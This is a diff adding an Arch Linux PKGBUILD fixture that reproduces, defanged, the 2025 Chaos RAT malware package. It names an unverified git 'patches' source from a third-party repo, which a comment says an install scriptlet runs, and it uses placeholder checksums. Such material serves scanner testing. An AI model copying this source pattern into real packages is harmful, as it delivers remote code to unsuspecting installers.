@@ -1,0 +1,20 @@
+# Defanged Chaos RAT reproduction (July 2025): a "patches" source from the
+# uploader's own repo, run by python from the root .install scriptlet.
+pkgname=chaos-rat
+pkgver=140.0
+pkgrel=1
+pkgdesc="Fixture"
+arch=('x86_64')
+url="https://www.mozilla.org/firefox/"
+license=('MPL-2.0')
+install=chaos-rat.install
+source=("https://ftp.mozilla.org/pub/firefox/ff-$pkgver.tar.xz"
+        "patches::git+https://github.com/danikpapas/zenbrowser-patch.git")
+sha256sums=('4444444444444444444444444444444444444444444444444444444444444444'
+            'SKIP')
+
+package() {
+  install -d "$pkgdir/opt/chaos-rat"
+  cp -r firefox "$pkgdir/opt/chaos-rat/"
+  cp -r patches "$pkgdir/opt/chaos-rat/"
+}
